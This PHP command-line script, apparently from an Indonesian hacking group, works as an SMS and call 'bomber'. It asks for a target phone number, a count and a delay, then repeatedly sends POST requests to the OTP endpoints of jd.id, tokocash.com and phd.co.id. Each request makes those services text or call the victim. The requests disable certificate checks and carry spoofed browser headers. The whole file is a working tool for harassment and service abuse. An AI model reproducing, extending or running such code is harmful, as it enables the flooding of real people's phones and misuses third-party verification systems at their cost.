<?php
error_reporting(0);
/*
tools ini di gunakan untuk kesenangan semata 
author : galehdotid
txh : indoXploit - SGB TEAM - SukabumiBlackHat

*/

 print "==============================================\n";
 print " _____ ____   __ __                           \n";
 print " / ___/|    \ |  |  |                         \n";
 print "(   \_ |  o  )|  |  |                         \n";
 print " \__  ||     ||  _  |                         \n";
 print " /  \ ||  O  ||  |  |                         \n";
 print " \    ||     ||  |  |                         \n";
 print "  \___||_____||__|__|                         \n";
 print "          SukabumiBlackHat  galehdotid        \n";
 print "==============================================\n";

 print "\n Services available: \n";
    print "    [1] Spam SMS  by  jdid\n";
    print "    [2] Spam Call by  Tokcalll\n";
    print "    [3] Spam SMS  by  PHD\n";
    print "    [4] Spam SMS  by  tokopedia\n";
    print "      Pakai => ";

        $cari = fopen ("php://stdin","r");
        $tool = fgets($cari);

          if($tool == 1 ){
            function jdidbom($no, $jum, $delay = 0){
                $x = 1; 
                while($x < $jum) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
                $server_output = json_decode(curl_exec($ch));
                 if($server_output->success){
                    echo "succes kirim ke =>".$no."\n";
                 }else{
                    echo "gagal kirim ke =>".$no."\n";
                 }
                curl_close ($ch);
                sleep($delay);
                $x++;
                flush();
    }
}
echo "Masukan No Target ? contoh(0858178365***) \nNo Target =>";
$nomor = trim(fgets(STDIN));
echo "Jumlah Spam?\nMasukan Jumlah spam => ";
$jumlah = trim(fgets(STDIN));
echo "Delay? 0-9999999999 \nJeda => ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
print "Tugas selesai bos !\n";

          }
elseif($tool == 2){
    function tokcall($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=call");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = json_decode(curl_exec ($ch));
          if($server_output->code == 200000){
            echo "succes Telpon ke =>".$no."\n";
          }else{
            echo "gagal Telpon ke => ".$no."\n";
          }
        curl_close ($ch);
        sleep($wait);
        $x++;
        flush();
    }
}
echo "Masukan No Target ? contoh(0858178365***) \nNo Target =>";
$nomor = trim(fgets(STDIN));
echo "Jumlah Spam?\nMasukan Jumlah spam => ";
$jumlah = trim(fgets(STDIN));
echo "Delay? 0-9999999999 \nJeda => ";
$jeda = trim(fgets(STDIN));
$execute = tokcall($nomor, $jumlah, $jeda);
print $execute;
print "Tugas selesai bos !\n";
}
elseif($tool == 3){
    function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = json_decode(curl_exec ($ch));
         if($server_output->status == "OK"){
            echo "succes kirim ke =>".$no."\n";
         }else{
            echo "gagal kirim ke =>".$no."\n";
         }
        curl_close ($ch);
        sleep($wait);
        $x++;
        flush();
    }
}
echo "Masukan No Target ? contoh(0858178365***) \nNo Target =>";
$nomor = trim(fgets(STDIN));
echo "Jumlah Spam?\nMasukan Jumlah spam => ";
$jumlah = trim(fgets(STDIN));
echo "Delay? 0-9999999999 \nJeda => ";
$jeda = trim(fgets(STDIN));
$execute = phd($nomor, $jumlah, $jeda);
print $execute;
print "Tugas selesai bos !\n";
}
elseif($tool == 4){
      function toksms($no, $jum, $wait){
       $x = 0; 
       while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=".$no."&accept=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.tokocash.com/oauth/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = json_decode(curl_exec ($ch));
          if($server_output->code == 200000){
            echo "succes kirim ke =>".$no."\n";
          }else{
            echo "gagal kirim ke => ".$no."\n";
          }
        curl_close ($ch);
        sleep($wait);
        $x++;
        flush();
    }
}
echo "Masukan No Target ? contoh(0858178365***) \nNo Target =>";
$nomor = trim(fgets(STDIN));
echo "Jumlah Spam?\nMasukan Jumlah spam => ";
$jumlah = trim(fgets(STDIN));
echo "Delay untuk tools ini 30 detik ! \nJeda => ";
$jeda = trim(fgets(STDIN));
$execute = toksms($nomor, $jumlah, $jeda);
print $execute;
print "Tugas selesai bos !\n";
}


?>